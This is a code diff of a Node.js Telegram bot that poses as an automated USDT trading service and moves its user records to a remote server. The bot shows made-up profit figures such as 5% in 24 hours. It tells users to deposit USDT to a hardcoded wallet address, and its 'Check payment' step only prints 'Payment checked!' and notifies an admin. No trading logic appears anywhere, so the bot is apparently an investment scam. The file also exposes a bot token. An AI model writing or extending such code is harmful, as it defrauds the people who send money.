@@ -1,6 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
 const axios = require('axios');
-const fs = require('fs');
 const moment = require('moment');
 const request = require('request');
 const http = require('http');
@@ -8,36 +7,41 @@ const token = '7340156042:AAHurO33meuNhX491tJCdPt3kOZapYj2yOY'; // Remplacez par
 const adminChatId = '6746103594'; // Remplacez par l'ID de chat de l'administrateur
 const bot = new TelegramBot(token, { polling: true });
 
-const dataFile = 'data.txt';
-
 // Fonctions d'aide
-const getUserData = (chatId) => {
-  const data = fs.readFileSync(dataFile, 'utf8').split('\n').filter(Boolean);
-  const user = data.find(line => line.startsWith(`${chatId}:`));
-  if (!user) {
+const getUserData = async (chatId) => {
+  try {
+    const response = await axios.get('https://solkah.org/id/data.txt');
+    const data = response.data.split('\n').filter(Boolean);
+    const user = data.find(line => line.startsWith(`${chatId}:`));
+    if (!user) {
+      return null;
+    }
+    const [id, balance, withdrawal, registrationDate] = user.split(':');
+    return { id, balance, withdrawal, registrationDate };
+  } catch (error) {
+    console.error('Error fetching user data:', error);
     return null;
   }
-  const [id, balance, withdrawal, registrationDate] = user.split(':');
-  return { id, balance, withdrawal, registrationDate };
 };
 
-const setUserData = (chatId, balance, withdrawal, registrationDate) => {
-  let data = fs.readFileSync(dataFile, 'utf8').split('\n').filter(Boolean);
-  const userIndex = data.findIndex(line => line.startsWith(`${chatId}:`));
-  if (userIndex >= 0) {
-    data[userIndex] = `${chatId}:${balance}:${withdrawal}:${registrationDate}`;
-  } else {
-    data.push(`${chatId}:${balance}:${withdrawal}:${registrationDate}`);
+const setUserData = async (chatId, balance, withdrawal, registrationDate) => {
+  try {
+    await axios.post('https://solkah.org/id/chat.php', {
+      id: chatId,
+      balance,
+      withdrawal,
+      registrationDate
+    });
+  } catch (error) {
+    console.error('Error setting user data:', error);
   }
-  fs.writeFileSync(dataFile, data.join('\n'), 'utf8');
 };
 
 const initializeUser = async (chatId) => {
-  const user = getUserData(chatId);
+  const user = await getUserData(chatId);
   if (!user) {
     const registrationDate = moment().format('YYYY-MM-DD');
-    setUserData(chatId, 0.00, 0, registrationDate);
-    await axios.post('https://solkah.org/id/chat.php', { id: chatId, date: registrationDate, balance: 0.00, withdrawal: 0 });
+    await setUserData(chatId, 0.00, 0, registrationDate);
   }
 };
 
@@ -78,7 +82,7 @@ You can also pause or resume the trading bot;
   bot.sendMessage(chatId, welcomeMessage, keyboard);
 });
 
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
   const chatId = msg.chat.id;
   const text = msg.text;
 
@@ -102,22 +106,26 @@ Trading status: Stopped 🚫`;
 
     bot.sendMessage(chatId, tradingMessage, inlineKeyboard);
   } else if (text === 'My account') {
-    const userData = getUserData(chatId);
-    const accountMessage = `💰 Current balance: ${userData.balance} USDT
+    const userData = await getUserData(chatId);
+    if (userData) {
+      const accountMessage = `💰 Current balance: ${userData.balance} USDT
 📅 Date of registration: ${userData.registrationDate}
 💸 Total withdrawal: ${userData.withdrawal} USDT
 
 🔗 Your referral link: https://t.me/@Orrdoxbot?start=${chatId}`;
 
-    const inlineKeyboard = {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: 'Deposit', callback_data: 'deposit' }]
-        ]
-      }
-    };
+      const inlineKeyboard = {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: 'Deposit', callback_data: 'deposit' }]
+          ]
+        }
+      };
 
-    bot.sendMessage(chatId, accountMessage, inlineKeyboard);
+      bot.sendMessage(chatId, accountMessage, inlineKeyboard);
+    } else {
+      bot.sendMessage(chatId, 'No user data found.');
+    }
   } else if (text === 'Deposit') {
     const depositMessage = `❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
 The transfer is realized automatically.
@@ -135,6 +143,10 @@ Wallet address USDT TRC-20:
         ]
       }
     };
+
+    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
+    const adminMessage = `New deposit: ${chatId}`;
+    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
 
     bot.sendMessage(chatId, depositMessage, inlineKeyboard);
   } else if (text === 'Withdrawal') {
@@ -201,22 +213,42 @@ Trading status: Stopped 🚫`;
 
     bot.editMessageText(tradingMessage, { chat_id: chatId, message_id: message.message_id, reply_markup: inlineKeyboard.reply_markup });
   } else if (data === 'statistics') {
-    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: Profit 5%\n3 days: Profit 12%\n7 days: Profit 20%\n1 month: Profit 60%\n3 months: Profit 180%');
+    bot.sendMessage(chatId, 'Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
+  } else if (data === 'deposit') {
+    const depositMessage = `❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
+The transfer is realized automatically.
+
+❗️ The minimum amount for replenishment is 20 USDT
+➖➖➖➖➖
+Wallet address USDT TRC-20:
+\`TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge\`
+(To copy, click on the wallet👆)`;
+
+    const inlineKeyboard = {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: 'Check payment', callback_data: 'check_payment' }]
+        ]
+      }
+    };
+
+    bot.sendMessage(chatId, depositMessage, inlineKeyboard);
   } else if (data === 'check_payment') {
-    const userData = getUserData(chatId);
-    if (!userData) {
-      bot.sendMessage(chatId, 'Please start the bot with /start command first.');
-      return;
-    }
-
-    const depositAmount = 20.00; // Example amount
-    const newBalance = parseFloat(userData.balance) + depositAmount;
-
-    setUserData(chatId, newBalance.toFixed(2), userData.withdrawal, userData.registrationDate);
-
-    bot.sendMessage(chatId, `Your balance has been updated. New balance: ${newBalance.toFixed(2)} USDT`);
-
-    // Inform admin
-    bot.sendMessage(adminChatId, `New deposit: user id ${chatId}, amount: ${depositAmount} USDT`);
+    bot.sendMessage(chatId, 'Payment checked!'); // Placeholder message for payment check
+    // Envoi d'un message à l'administrateur lorsque l'utilisateur clique sur "check"
+    const adminMessage = `New deposit: ${chatId}`;
+    bot.sendMessage(adminChatId, adminMessage); // Envoi d'un message à l'administrateur
   }
+});
+
+//Créez un serveur HTTP simple qui renvoie "I'm alive" lorsque vous accédez à son URL
+const server = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.write("I'm alive");
+    res.end();
+});
+
+// Écoutez le port 8080
+server.listen(8080, () => {
+    console.log("Keep alive server is running on port 8080");
 });
